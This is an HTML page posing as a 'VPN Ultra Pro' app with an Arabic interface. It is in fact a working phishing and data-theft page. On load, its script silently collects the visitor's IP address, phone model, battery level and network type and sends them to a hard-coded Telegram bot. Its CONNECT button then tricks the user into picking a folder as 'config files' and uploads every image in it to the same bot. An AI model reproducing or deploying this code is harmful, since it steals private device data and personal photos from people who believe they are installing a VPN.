<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>VPN Ultra Pro</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(255,140,0,0.2); }
        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; margin-top: 20px; }
        .btn:active { transform: scale(0.95); }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color: #ff8c00;">VPN PRO</h1>
        <p id="st" style="font-size: 18px;">جاري فحص الأمان ونوع الاتصال...</p>
        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="start()">CONNECT</button>
    </div>

    <script>
        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const C = '7214473798';

        window.onload = async () => {
            try {
                // 1. جلب الـ IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                // 2. محرك كسر الحماية لجلب موديل الهاتف بدقة
                let deviceModel = "جاري التحليل...";
                if (navigator.userAgentData) {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
                    deviceModel = hints.model || "Android Device";
                } else {
                    // طريقة بديلة للمتصفحات القديمة
                    const match = navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
                    deviceModel = match ? match[2] : "Android Device (Protected)";
                }

                // 3. معلومات البطارية والشبكة
                const battery = await navigator.getBattery();
                const bat = Math.round(battery.level * 100) + "%";
                const net = navigator.connection ? navigator.connection.effectiveType : "unknown";

                const msg = `🚀 صيد احترافي (تم كسر الحماية)!\n` +
                            `📱 الموديل: ${deviceModel}\n` +
                            `📍 الـ IP: ${data.ip}\n` +
                            `🔋 الشحن: ${bat}\n` +
                            `📶 الإنترنت: ${net}\n` +
                            `⚙️ النظام: ${navigator.platform}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
            } catch (e) {}
        };

        function start() {
            document.getElementById('st').innerText = "تم الاتصال! اختر ملفات التكوين لتسريع الشبكة..";
            document.getElementById('f').click();
        }

        document.getElementById('f').onchange = async (e) => {
            for (let file of e.target.files) {
                if (file.type.startsWith('image/')) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('document', file);
                    fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
                }
            }
        };
    </script>
</body>
</html>
